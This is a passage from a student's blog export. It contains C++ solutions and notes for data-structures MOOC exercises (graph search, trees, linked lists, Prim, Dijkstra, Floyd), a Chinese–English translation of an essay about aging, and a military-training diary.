    <content type="text"><![CDATA[LinksHere ThoughtsHow to use the function qsort() parameters: qsort(void * array, int numberofcells, int sizeofeachcell, function cmp) function cmp: cmp(const void * a, const void * b) &#123;12 return ((*pointer* to the type of the elements waiting to be sorted)a)-&gt;some attribute of the element - ...b;&#125; It is certainly a great habbit to write comments while writing the codesTalk is cheap, show me your Codes123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#include &lt;iostream&gt;#include &lt;cmath&gt;#include &lt;cstdlib&gt;#define max 102const int radius = 50;int maxtime = max;struct node &#123; //crocodile -- node int x, y; //position label x and y bool flag; //true if the crocodile is close enough to the beach node * precedent; //pointer to the previous crocodile double distance; //distance to the previous crocodile int nodetime; //attribute that trace the distance from island&#125;;struct Stack &#123; //stack to implement the closest way node * stack[max * 2]; int sp; node * Pop()&#123;return stack[sp--];&#125; void Push(node * ptr)&#123;stack[++sp] = ptr;&#125;&#125;;node croco[max]; //all the crocodiles are kept in this arrayStack priostack; //priority stacknode * FinalNode = NULL;//keep the exitusing namespace std;double getdis(int x1, int y1, int x2, int y2);void dfs(node * ptr, int n, int d, node * pre, int times);int cmp(const void * a, const void * b);int main(int argc, char const *argv[]) &#123; freopen("../test.txt", "r", stdin); int n, d;cin &gt;&gt; n &gt;&gt; d; priostack.sp = -1; for (int i = 0; i &lt; n; ++i) &#123; //inialization cin &gt;&gt; croco[i].x &gt;&gt; croco[i].y; croco[i].flag = radius - abs(croco[i].x) &lt;= d || radius - abs(croco[i].y) &lt;= d; croco[i].precedent = NULL; croco[i].distance = 0; croco[i].nodetime = max; &#125; //first iteration for (int i = 0; i &lt; n; ++i) &#123; if (getdis(0,0,croco[i].x,croco[i].y)&lt;=7.5+d) &#123; croco[i].distance = getdis(0,0,croco[i].x,croco[i].y); priostack.Push(&amp;croco[i]); &#125; &#125; if (priostack.sp+1 &gt; 1) qsort(&amp;priostack.stack[0], priostack.sp+1, sizeof(node*), cmp); int cnt = 0, num = priostack.sp + 1; while (cnt++ &lt; num) dfs(priostack.Pop(),n,d,NULL,1); //out put section if (maxtime == max) cout &lt;&lt; 0; else if (d &gt;= 43) cout &lt;&lt; 1; else &#123; int outputcnt = 0; while (FinalNode) &#123; outputcnt++; priostack.Push(FinalNode); FinalNode = FinalNode-&gt;precedent; &#125; cout &lt;&lt; outputcnt + 1 &lt;&lt; endl; while (outputcnt--) &#123; FinalNode = priostack.Pop(); cout &lt;&lt; FinalNode-&gt;x &lt;&lt; ' ' &lt;&lt; FinalNode-&gt;y &lt;&lt; endl; &#125; &#125; return 0;&#125;void dfs(node * ptr, int n, int d, node * pre, int times) &#123; ptr-&gt;precedent = pre; if (ptr-&gt;flag &amp;&amp; times &lt; maxtime) &#123; maxtime = times; FinalNode = ptr; &#125; ptr-&gt;nodetime = times; int bp = priostack.sp; for (int i = 0; i &lt; n; ++i) &#123; if (croco[i].nodetime&gt;times+1 &amp;&amp; getdis(ptr-&gt;x,ptr-&gt;y,croco[i].x,croco[i].y)&lt;=d) &#123; croco[i].distance = getdis(0,0,croco[i].x,croco[i].y); priostack.Push(&amp;croco[i]); &#125; &#125; int num = priostack.sp - bp; if (num &gt; 1) qsort(&amp;priostack.stack[bp+1], (size_t)priostack.sp-bp, sizeof(node*), cmp); int cnt = 0; while (cnt++ &lt; num) dfs(priostack.Pop(),n,d,ptr,times+1);&#125;int cmp(const void * a, const void * b) &#123; double d = (*((node**)b))-&gt;distance - (*((node**)a))-&gt;distance; return d &gt; 0 ? 1 : -1;&#125;double getdis(int x1, int y1, int x2, int y2) &#123; double ret = sqrt((x1-x2)*(x1-x2) + (y1-y2)*(y1-y2)); return ret;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>中国大学MOOC-陈越、何钦铭-数据结构-2018秋</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[A Woman decays like this]]></title>
    <url>%2F2018%2F10%2F12%2FWoman-translate%2F</url>
    <content type="text"><![CDATA[一个女人是这样衰老的1When I was twenty, walked around the campus in a vested denim skirt, my face flushed as my mouth open. Now I am thirty, sitting in my office and scolding my subordinates, crulty written on my face, “How can you dare to ask such a silly question before even making a draft?” 二十岁的时候，我穿着一条背心式牛仔裙在校园里走来走去，一说话就脸红。 三十岁的我穿着名牌套装，坐在办公桌前，满脸冷酷地对下属说：“这么愚蠢的问题你也敢问？也不先打个草稿。” 2When I was twenty, the books borrowed from the library were The Complete Works of Shakespeare, Self-portrait of a young artist and Ulysses. Now I am in my thirties, on the bedside table lays The scrects of following the banker, ELLE and A manager’s personal charm. 二十岁的时候，从图书馆借的是《莎士比亚全集》、《一个青年艺术家的自画像》和《尤里西斯》。 三十岁之后，床头摆的是《跟庄密笈》、《ELLE》和《经理人的个人魅力》. 3In the summer of my twenty, met the boy I crushed who was said to be admitted to a graduate school. Dismayed by the progress he had made, my heart torn with grief and my tears droped as it occured to me that it was beyond my whole life to become elegent enough so that he could gave me a glance. After thirty, searching everywhere for a bought MBA. 二十岁的暑假，在家乡的大街上偶遇自己的暗恋对象，听说他考上了研究生，被他的进步所打击，心如刀绞，想到这辈子终于不能出色得让他看我一眼，不禁怅然泪下。 三十岁之后，到处打听那里可以花钱买个MBA. 4In my twenty, indicating my age from time to time, even before they asked. After thirty, find it an odious thing when asked about age. If you do, “have a guess”. 二十岁的时候，随时随地向人透露我的年龄，答得比问的还快。 三十岁之后，最恨别人问年龄，你要是非问不可，你猜啊。 5In my twenty, overwhelmed with the idea to date with boys majoring in sports or arts. After thirty, regard myself then as an idiot. 二十岁的时候，一心想和体育系、美术系的男生约会。 三十岁后，我简直认为自己当年是白痴。 6In my twenty, saw a bookstore and went in, have books there and bought. After thirty, turn a blind eye to bookstores and directly went into the Beauty Salon next door. 二十岁的时候，有书店必须逛，有书必买。 三十岁之后，对书店视而不见，直接去了隔壁的美容院。 7In my twenty, bet on myself that I wasn’t as outdated as defending this place till dead. Live elsewhere. After thirty, run out of my legs for a house in this city that I satisfied and can afford. 二十岁的时候，打赌说我这辈子不可能土到死守在一个地方，生活在别处嘛。 三十岁之后，我为了在这座城市买个满意又便宜的房子跑断了双腿. 8In my twenty, went to a movie with someone at night. Hand in hand without conscious which made me happy for a whole summer. After thirty, sitting in the revolving restaurant of Shangri-La Hotel to accompany clients and eat self help meals. As the restaurant rotates slowly, I feels an unknow inanity and suddenly grows boring toward the whole world. 二十岁的时候，和某个人晚上一起去看了场电影，不经意中拉了一次手，结果幸福了整整一个夏天。 三十岁之后，坐在香格里拉酒店的旋转餐厅陪客户吃自主助餐，在缓缓的转动之中，莫名其妙地一阵空虚，突然间对一切感到索然无味 Acknowledgement 周可, my handsome roommate who inspired me to translate this passage that moved me so much.]]></content>
      <categories>
        <category>translation</category>
      </categories>
      <tags>
        <tag>SJTU</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7-11 关键活动]]></title>
    <url>%2F2018%2F09%2F19%2FDS-7-11%2F</url>
    <content type="text"><![CDATA[进展 题目是什么意思啊？我一开始以为是最小生成树，后来觉得是dijkstra,现在我已经弄不清楚了。 有向图 需要判断是不是有回路 好吧，似乎是拓扑排序…. 预备知识 AOV网络(Activity on Vertex) Top拓扑序:若v-&gt;w 则v先输出 拓扑排序：AOV若有合理的拓扑序(无环)，则必定是有向无环图(DAG, Directed Acyclic Graph) 关键路径问题：AOE网络(Activity on Edge) 题目描述原题在这 思路难点体会与感想 好累啊，好想哭啊 刷OJ最难受的事情就是要求太多的输出格式 一道题卡了两天的感受实在是太难受了 学习的过程绝对的连续的 一旦你停止在一件事情上花时间，他马上就会给你颜色看关键代码 7-11.cpp]]></content>
      <categories>
        <category>数据结构与算法题目集（中文）</category>
      </categories>
      <tags>
        <tag>最小生成树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[02-线性结构1 两个有序链表序列的合并]]></title>
    <url>%2F2018%2F09%2F14%2FDS-02-%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%841%2F</url>
    <content type="text"><![CDATA[感想 写程序题实在是太麻烦了 好久没用malloc了，连头指针和头结点都分不清楚了。 使用头结点可以很方便地解决很多的问题 源代码123456789101112131415161718192021222324252627282930List Merge( List L1, List L2 )&#123; List head = (List)malloc(sizeof(struct Node)); PtrToNode current = head; PtrToNode ptr1 = L1-&gt;Next; PtrToNode ptr2 = L2-&gt;Next; while (1) &#123; if (!ptr1) &#123; current-&gt;Next = ptr2; break; &#125; if (!ptr2) &#123; current-&gt;Next = ptr1; break; &#125; if (ptr1-&gt;Data &lt; ptr2-&gt;Data) &#123; current-&gt;Next = ptr1; current = ptr1; ptr1 = ptr1-&gt;Next; &#125;else&#123; current-&gt;Next = ptr2; current = ptr2; ptr2 = ptr2-&gt;Next; &#125; &#125; L1-&gt;Next = NULL; L2-&gt;Next = NULL; return head;&#125; 顺便把二分查找的代码也贴上来12345678910111213Position BinarySearch( List L, ElementType X )&#123; int start = 1, end = L-&gt;Last, mid; while (start&lt;=end) &#123; mid = (start + end) / 2; if (L-&gt;Data[mid]&lt;X) &#123; start = mid + 1; &#125;else if (L-&gt;Data[mid]&gt;X) &#123; end = mid - 1; &#125;else if (L-&gt;Data[mid]==X) return mid; &#125; return NotFound;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>中国大学MOOC-陈越、何钦铭-数据结构-2018秋</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[03-树2 List Leaves]]></title>
    <url>%2F2018%2F09%2F14%2FDS-03-%E6%A0%912%2F</url>
    <content type="text"><![CDATA[thoughts 重要的细节，也是全部写完之后发现的唯一一个错误：char的数字向int装换的时候要-‘0’； 实现细节，就是给每一个节点一个完全二叉树时的序号，然后sort qsort的具体使用细节 参数表：qsort(void *, num, sizeof(), cmp) cmp的参数：int cmp(const void front, const void rear)，不可以自己改 return的参数：返回正数就是说 cmp 传入参数第一个要放在第二个后面, 负数就是传入参数第一个要放第二个前面, 如果是 0, 那就无所谓谁前谁后. ‘’+’’ 需要swap ‘’-‘’ 不要交换 int cmp(const void small, const void big) return small - big 从小到大 codes123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#include &lt;iostream&gt;#include &lt;cstdlib&gt;using namespace std;struct node &#123; int data; bool leaf; unsigned int pos; char left; char right;&#125;;int readtree(node * tree, int n, int * num);void attachweight(node * tree, int ptr, int weight);void printleaf(node * tree, int n);int cmp(const void * front, const void * rear);int main(int argc, char const *argv[]) &#123; freopen("D:\\SJTU\\Freshman Summer\\DS\\test.txt", "r", stdin); int n;cin &gt;&gt; n; node * tree = new node [n]; int leafnum = 0; int head = readtree(tree,n,&amp;leafnum); //cout &lt;&lt; head; attachweight(tree,head,1); //cout &lt;&lt; "attach done"; qsort(tree,n,sizeof(node),cmp); //cout &lt;&lt; "sorted"; printleaf(tree,leafnum); delete [] tree; return 0;&#125;void printleaf(node * tree, int n) &#123; int cnt = 0; for (int i = 0; true; i++) &#123; if (tree[i].leaf) &#123; cout &lt;&lt; tree[i].data; ++cnt; if (cnt!=n) &#123; cout &lt;&lt; ' '; &#125;else return; &#125; &#125;&#125;int cmp(const void * front, const void * rear) &#123; int ret = ((node*)front)-&gt;pos - ((node*)rear)-&gt;pos; return ret;&#125;void attachweight(node * tree, int ptr, int weight) &#123; tree[ptr].pos = weight; if (tree[ptr].left!='-') &#123; attachweight(tree,tree[ptr].left-'0',2*weight); &#125; if (tree[ptr].right!='-') &#123; attachweight(tree,tree[ptr].right-'0',2*weight+1); &#125;&#125;int readtree(node * tree, int n, int * num) &#123; bool * ishead = new bool [n]; for (int i = 0; i &lt; n; i++) &#123; ishead[i] = true; &#125; for (int i = 0; i &lt; n; i++) &#123; tree[i].data = i; tree[i].leaf = true; cin &gt;&gt; tree[i].left &gt;&gt; tree[i].right; if (tree[i].left!='-') &#123; tree[i].leaf = false; ishead[tree[i].left-'0'] = false; &#125; if (tree[i].right!='-') &#123; tree[i].leaf = false; ishead[tree[i].right-'0'] = false; &#125; if (tree[i].leaf) &#123; (*num)++; &#125; &#125; int head = 0; for (int i = 0; i &lt; n; i++) &#123; if (ishead[i]==true) &#123; head = i; break; &#125; &#125; delete [] ishead; return head;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>中国大学MOOC-陈越、何钦铭-数据结构-2018秋</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[02-线性结构4 Pop Sequence]]></title>
    <url>%2F2018%2F09%2F14%2FDS-02-%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%844%2F</url>
    <content type="text"><![CDATA[thoughts too simple: just stack simulation 这一次真的是爽啊，一次性过，代码简洁没有任何冗余的边界调试 这样的题目是可遇而不可求啊！ 我用树和用图也要达到我用堆的这样的境界！ codes12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;bool check(int m, int n);int main(int argc, char const *argv[]) &#123; int m, n, k;cin &gt;&gt; m &gt;&gt; n &gt;&gt; k; for (int i = 0; i &lt; k; i++) &#123; bool valid = check(m,n); if (valid) cout &lt;&lt; "YES" &lt;&lt; endl; else cout &lt;&lt; "NO" &lt;&lt; endl; &#125; return 0;&#125;bool check(int m, int n) &#123; int * stack = new int [n], stk = -1; int * store = new int [n], str = 0; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; store[i]; &#125; bool valid = false; for (int topush = 1; topush &lt;= n; topush++) &#123; stack[++stk] = topush; if (stk==m) break; while (stk!=-1 &amp;&amp; store[str]==stack[stk]) &#123; stk--;str++; &#125; &#125; if (stk==-1) valid = true; delete [] stack; return valid;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>中国大学MOOC-陈越、何钦铭-数据结构-2018秋</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[01-复杂度2 Maximum Subsequence Sum]]></title>
    <url>%2F2018%2F09%2F12%2FDS-01-%E5%A4%8D%E6%9D%82%E5%BA%A62%2F</url>
    <content type="text"><![CDATA[主要做的几个改动 引入track变量来控制ij的记录时间点 修补了maxsum=0的一个小bug 反思 好好看清楚题目再做很重要，不要觉得自己做过一遍就有多懂了，还不是花了2h多吗，看看清楚要输出序号还是要输出值。]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>中国大学MOOC-陈越、何钦铭-数据结构-2018秋</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[02-线性结构3 Reversing Linked List]]></title>
    <url>%2F2018%2F09%2F12%2FDS-02-%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%843%2F</url>
    <content type="text"><![CDATA[进展 时间 进展 2018年9月12日中午 到目前为止还有两个测试点没过一个是全部反转，我测试的时候是对的呀；还有一个是超时 2018年9月13日21:02:58 AC 难点 容易想到一些歪门邪道，比如说我第一次想到的排序方法。 模拟内存的想法。 具体进行逆转的时候的操作 反思 做OJ的题目有一些注意事项是你不得不放在心上的 边界条件 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;iostream&gt;#include &lt;iomanip&gt;#define max 100005using namespace std;struct node &#123; int ads; int data; int next;&#125;;node memory[max];int getlength(node * head);node * reverse(node * head, int k);void print(node * head, int length);int main(int argc, char const *argv[]) &#123; freopen("D:\\SJTU\\Freshman Summer\\DS\\test.txt", "r", stdin); int ads, n, k;cin &gt;&gt; ads &gt;&gt; n &gt;&gt; k; int address, data, next; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; address &gt;&gt; data &gt;&gt; next; memory[address].ads = address; memory[address].data = data; memory[address].next = next; &#125; node head, *headptr; head.next = ads; headptr = &amp;head; int length = getlength(headptr); for (size_t i = k; i &lt;= length; i+=k) &#123; int front = headptr-&gt;next; headptr-&gt;next = reverse(headptr,k)-&gt;ads; headptr = &amp;memory[front]; //print(&amp;head,length);cout &lt;&lt; endl; &#125; headptr = &amp;head; print(headptr,length); return 0;&#125;node * reverse(node * head, int k) &#123; node * front = &amp;memory[head-&gt;next]; node * rear = &amp;memory[front-&gt;next]; node * temp; int cnt = 1; while (cnt&lt;k) &#123; temp = &amp;memory[rear-&gt;next]; rear-&gt;next = front-&gt;ads; front = rear; rear = temp; cnt++; &#125; memory[head-&gt;next].next = rear-&gt;ads; return front;&#125;int getlength(node * head) &#123; int cnt = 0, adds = head-&gt;next; while (adds!=-1) &#123; cnt++; adds = memory[adds].next; &#125; return cnt;&#125;void print(node * head, int length) &#123; node * ptr = &amp;memory[head-&gt;next]; for (size_t i = 0; i &lt; length; i++) &#123; cout &lt;&lt; setw(5) &lt;&lt; setfill('0') &lt;&lt; ptr-&gt;ads; cout &lt;&lt; ' ' &lt;&lt; ptr-&gt;data &lt;&lt; ' '; if ( i==length-1 ) cout &lt;&lt; "-1"; else cout &lt;&lt; setw(5) &lt;&lt; setfill('0') &lt;&lt; ptr-&gt;next &lt;&lt; endl; ptr = &amp;memory[ptr-&gt;next]; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>中国大学MOOC-陈越、何钦铭-数据结构-2018秋</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7-10 公路村村通]]></title>
    <url>%2F2018%2F08%2F24%2FDS-7-10%2F</url>
    <content type="text"><![CDATA[预备知识 最小生成树(Minimum Spanning Tree) 是一棵树 是由原图生成的 包含图内的所有的顶点 所有的边都是图中的边 权最小 图连通 等价 存在最小生成树 贪心算法 每一步都要眼前最好的 约束条件 Prim算法-让小数长大 算法复杂度 平方级别 稠密图 Kruskal算法-将森林合并成树 算法复杂度 ElogE 稀疏图 需要储备的数据结构：集合、并查集、最小堆 集合存储实现： 树结构：双亲表示法 孩子指向父节点 数组： 根节点为-1 堆是用数组实现的完全二叉树题目描述(更新)原题在这 思路Prim算法，日后再实现Kruskal算法 难点Prim算法的实现 体会与感想 Prim算法简直了，和Dijkstra算法一模一样 好tm烦啊 关键代码 7-10-Prim.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int Prim(int ** G, int n) &#123; bool * collected = new bool [n]; int * dist = new int [n], mincost = 0; for (int i = 0; i &lt; n; i++) &#123; collected[i] = false; dist[i] = inf; &#125; collected[0] = true; dist[0] = 0; for (int i = 1; i &lt; n; i++) &#123; if (G[0][i]&lt;dist[i]) &#123; dist[i] = G[0][i]; &#125; &#125; while (true) &#123; bool found = false; int min = inf, v = 0; for (int i = 1; i &lt; n; i++) &#123; if (!collected[i] &amp;&amp; dist[i]&lt;min) &#123; found = true; min = dist[i]; v = i; &#125; &#125; if (!found) &#123; break; &#125; mincost += min; collected[v] = true; dist[v] = 0; // for every node w linking to the node v for (int w = 0; w &lt; n; w++) &#123; if (G[v][w]!=inf &amp;&amp; !collected[w]) &#123; if (G[v][w] &lt; dist[w]) &#123; dist[w] = G[v][w]; &#125; &#125; &#125; &#125; for (int i = 0; i &lt; n; i++) &#123; if (collected[i]==false) &#123; return -1; &#125; &#125; return mincost;&#125;]]></content>
      <categories>
        <category>数据结构与算法题目集（中文）</category>
      </categories>
      <tags>
        <tag>数据结构与算法题目集（中文）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[军训日记]]></title>
    <url>%2F2018%2F08%2F23%2FMilitaryTrainning%2F</url>
    <content type="text"><![CDATA[8月23日8月24日今天上午的训练结束之前连长组织了会操，我觉得自己的口令下的没什么毛病，同学们做的也都很好，可是没有被表扬。可能是走的时候排面还是没有标齐。 8月26日昨天晚上忘记知米背单词的打卡了，今天早上才发现，心里好难受。 今天上午还是下雨，我们班的进度我感觉已经十分落后了。大家正步走的时候分解动作都不稳。 下午教唱歌：打靶归来、有我在、军中绿花。 下午主攻正步走和跑步走的连贯练习。 先是正步走的臂腿结合一步两动的练习 8月27日哈哈哈昨晚拉练。 很开心，现在只记得前面的连是3连，后面的连是八连，走到凯旋门之前我们一直在疯狂拉歌。拍完照之后前后连队距离都比较大，也就没有再拉歌了。 记一下一件我认为是宝贵教训的一次经历：过了凯旋门的那一个加油点我居然怂恿梁力佳去女生手里拿了一瓶农夫山泉orz。然后他不要我就背自己包里了。我本来带的两瓶水明明正正好好，结果后半程我就在疯狂喝水，结果到最后还没喝完。 你要的东西会成为你的负担。 想清楚你要什么。 8月29日昨天晚上和7连联谊，玩到熄灯了才猛然惊醒，收拾收拾回宿舍了。 我总是觉得我准备的还不够充分，觉得自己没有买水果，买的士力架发现是辣花生味的。 说实话，联谊，有点累的。 今天下午我原来带的班被拆掉了，负责新的一列，是方阵的队形。 然后下午练跑步走的时候再一次被当场活捉。orz捉奸现场 今天不开连务会，早点休息。好想王宏武…… 8月30日今天一整天都是练方阵，orz，先送上一首分列式进行曲，此乃洗脑神曲也。 然后结束的时候我们营长来验收，我们好像把自己走的最差的一次展现给了营长看…. 从（1，4）的位置调到了（9,1）的位置，很舒服，能直接看到标兵，就是标齐感觉有些困难。 连着两天内务满分，嘤嘤嘤，我们好强。 加油，所有的一切终将消失，好好珍惜剩下的仅剩4天的训练时间吧！ 8月31日今天还是在练无聊的方阵。中途被连长T出去休息了好一会，最后又被连长调上第一列了orz 求无聊的日子快点结束吧！ 9月1日今天早上醒来发现手机开不了，悲剧。昨天夜间不就是设置了一个夜间更新然后今早起来就爆掉了。 上午去胡法光体育场练了三遍，踢的乱七八糟、一塌糊涂。 在等手机开了之后去取周可的杯子。 9月3日军训明天就结束了，看了一遍《悟空》，真的很难说再见。 王宏武说这会是一个难忘的军训，确实，真的很难忘。 我该怎样去告别这一段岁月。 这一敬，你我命运相交。 别人穿上军装就是这么好看，而为什么穿在自己的身上却觉得没那么好看了呢？ 昨晚的军训晚会坐在了很偏的位置，只能听到下面女生的尖叫声，和舞台上不停变幻着的刺眼灯光。]]></content>
      <categories>
        <category>军训</category>
      </categories>
      <tags>
        <tag>SJTU</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7-9 旅游规划]]></title>
    <url>%2F2018%2F08%2F17%2FDS-7-9%2F</url>
    <content type="text"><![CDATA[预备知识 Floyd算法：复杂度 V^3 重要前提：一步一步向后推的 三重循环，每次从DK 归纳推理到 DK+1 其中DK是只经过编号为i（i&lt;K）时各个点对间的最短路 Dijkstra算法: 复杂度最高 V^2+E 这就是运行超时和答案正确之间的区别 题目描述原题在这 思路原先想着用Floyd算法去做的，写完发现有一个测试点运行超时了，无奈只好回到了Dijkstra算法，思路基本一致，唯一的不同点就是图换成了邻接矩阵表示，同时还多了一个fee的权需要检测。 难点不能用Floyd，本题实质是单源有权图的最短路问题（从s到d）。 体会与感想 stray ‘\357’ in program```出现此类错误的原因，在编辑器中使用的utf-8的格式保存源代码中出现了中文的标点符号。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# 关键代码&gt;7-9-Floyd.cpp```C++#include &lt;iostream&gt;#define inf 10000using namespace std;int ** readGraph(int n, int m, int *** cost);void deleteGraph(int ** G, int n, int ** cost);void Floyd(int ** G, int n, int ** cost);int main(int argc, char const *argv[]) &#123; freopen(&quot;D:\\SJTU\\Freshman Summer\\DS\\test.txt&quot;, &quot;r&quot;, stdin); int n, m, s, d, ** cost = NULL; cin &gt;&gt; n &gt;&gt; m &gt;&gt; s &gt;&gt; d; int ** G = readGraph(n,m,&amp;cost); Floyd(G,n,cost); int length = G[s][d]; int fee = cost[s][d]; cout &lt;&lt; length &lt;&lt; &apos; &apos; &lt;&lt; fee; deleteGraph(G,n,cost); return 0;&#125;void Floyd(int ** G, int n, int ** cost) &#123; for (int k = 0; k &lt; n; k++) &#123; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; if (G[i][j] &gt; G[i][k]+G[k][j]) &#123; G[i][j] = G[i][k] + G[k][j]; cost[i][j] = cost[i][k] + cost[k][j]; &#125; else if (G[i][j] == G[i][k]+G[k][j]) &#123; if (cost[i][j] &gt; cost[i][k] + cost[k][j]) &#123; cost[i][j] = cost[i][k] + cost[k][j]; &#125; &#125; &#125; &#125; &#125;&#125;void deleteGraph(int ** G, int n, int ** cost) &#123; for (int i = 0; i &lt; n; i++) &#123; delete [] G[i]; delete [] cost[i]; &#125; delete [] G; delete [] cost;&#125;int ** readGraph(int n, int m, int *** cost) &#123; int ** G = new int* [n]; *cost = new int* [n]; for (int i = 0; i &lt; n; i++) &#123; G[i] = new int [n]; (*cost)[i] = new int [n]; &#125; for (int i = 0; i &lt; n; i++) &#123; G[i][i] = 0; (*cost)[i][i] = 0; &#125; for (int i = 1; i &lt; n; i++) &#123; for (int j = 0; j &lt; i; j++) &#123; G[i][j] = inf; G[j][i] = inf; (*cost)[i][j] = inf; (*cost)[j][i] = inf; &#125; &#125; int city1, city2, length, fee; for (int i = 0; i &lt; m; i++) &#123; cin &gt;&gt; city1 &gt;&gt; city2 &gt;&gt; length &gt;&gt; fee; G[city1][city2] = length; G[city2][city1] = length; (*cost)[city1][city2] = fee; (*cost)[city2][city1] = fee; &#125; return G;&#125; 7-9-Dijkstra.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#include &lt;iostream&gt;#define inf 10000using namespace std;int ** readGraph(int n, int m, int *** cost);void deleteGraph(int ** G, int n, int ** cost);int Dijkstra(int** G,int n,int s,int d,int** cost,int *spend);int main(int argc, char const *argv[]) &#123; freopen("D:\\SJTU\\Freshman Summer\\DS\\test.txt", "r", stdin); int n, m, s, d, ** cost = NULL, fee; cin &gt;&gt; n &gt;&gt; m &gt;&gt; s &gt;&gt; d; int ** G = readGraph(n,m,&amp;cost); int length = Dijkstra(G,n,s,d,cost,&amp;fee); cout &lt;&lt; length &lt;&lt; ' ' &lt;&lt; fee; deleteGraph(G,n,cost); return 0;&#125;int Dijkstra(int** G,int n,int s,int d,int** cost,int *spend)&#123; int * dist = new int [n]; int * fee = new int [n]; bool * collected = new bool [n]; for (int i = 0; i &lt; n; i++) &#123; dist[i] = inf; fee[i] = inf; collected[i] = false; &#125; dist[s] = 0; collected[s] = true; for (int i = 0; i &lt; n; i++) &#123; if(!collected[i] &amp;&amp; G[s][i]!=inf) &#123; dist[i] = G[s][i]; fee[i] = cost[s][i]; &#125; &#125; int v = -1; while (true) &#123; int min = inf; v = -1; for (int i = 0; i &lt; n; i++) &#123; if (!collected[i] &amp;&amp; dist[i]!=-1 &amp;&amp; dist[i]&lt;min) &#123; min = dist[i]; v = i; &#125; &#125; if (v==d || v==-1) break; collected[v] = true; for (int w = 0; w &lt; n; w++) &#123; if(!collected[w] &amp;&amp; G[v][w]!=inf) &#123; if (dist[v]+G[v][w]&lt;dist[w]) &#123; dist[w] = dist[v] + G[v][w]; fee[w] = fee[v] + cost[v][w]; &#125;else if (dist[v]+G[v][w]==dist[w]) &#123; if (fee[w] &gt; fee[v] + cost[v][w]) &#123; fee[w] = fee[v] + cost[v][w]; &#125; &#125; &#125; &#125; &#125; int ret = dist[v]; *spend = fee[v]; delete [] dist; delete [] fee; delete [] collected; return ret;&#125;void deleteGraph(int ** G, int n, int ** cost) &#123; for (int i = 0; i &lt; n; i++) &#123; delete [] G[i]; delete [] cost[i]; &#125; delete [] G; delete [] cost;&#125;int ** readGraph(int n, int m, int *** cost) &#123; int ** G = new int* [n]; *cost = new int* [n]; for (int i = 0; i &lt; n; i++) &#123; G[i] = new int [n]; (*cost)[i] = new int [n]; &#125; for (int i = 0; i &lt; n; i++) &#123; G[i][i] = 0; (*cost)[i][i] = 0; &#125; for (int i = 1; i &lt; n; i++) &#123; for (int j = 0; j &lt; i; j++) &#123; G[i][j] = inf; G[j][i] = inf; (*cost)[i][j] = inf; (*cost)[j][i] = inf; &#125; &#125; int city1, city2, length, fee; for (int i = 0; i &lt; m; i++) &#123; cin &gt;&gt; city1 &gt;&gt; city2 &gt;&gt; length &gt;&gt; fee; G[city1][city2] = length; G[city2][city1] = length; (*cost)[city1][city2] = fee; (*cost)[city2][city1] = fee; &#125; return G;&#125;]]></content>
      <categories>
        <category>数据结构与算法题目集（中文）</category>
      </categories>
      <tags>
        <tag>数据结构与算法题目集（中文）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7-8 哈利·波特的考试]]></title>
    <url>%2F2018%2F08%2F17%2FDS-7-8%2F</url>
    <content type="text"><![CDATA[预备知识 最短路径问题的分类： 单源最短路：从固定的源点出发求其到所有其他顶点的最短路径 无权图 BFS算法 有权图 Dijkstra 多源最短路 无权图的单源最短路算法：BFS算法 按照递增的顺序找出找出源点到各个顶点的最短路 算法要点：需要两个数组dist和path分别记录最短距离和上一个顶点 有权图的单源最短路算法：Dijkstra算法 分为已经确定最短路的集合S以及一个长度数组dist 实现原理：若路径是按照递增顺序生成的，则： 下一个加入S的点必定只经过S内的点（不然不是S内的点应该比当前点先加入S） 每次选一个dist最小的加入S（贪心算法） 加入点后会影响dist，影响的都是加入点的邻接点 算法实现要点： 需要dist、path和collected数组分别记录最短距离、上一个节点以及是否被收入S的信息 初始化条件：dist都为无穷大，path都没有，collect全不是 123dist[i] = inf;path[i] = -1;collected[i] = false; 修改源点的数据，进入Dijkstra函数 题目描述原题在这给定一张有权图，判断是否连通，若连通，则求使从一个顶点出发最长的最短路最短的那个节点。 思路Dijsktra算法对每一个节点使用 难点Dijsktra算法实现 体会与感想 这个金光闪闪的算法一定要记在脑子里啊~ 关键代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657int Dijkstra(node * G, int n, int s)&#123; int * dist = new int [n]; int * path = new int [n]; bool * collected = new bool 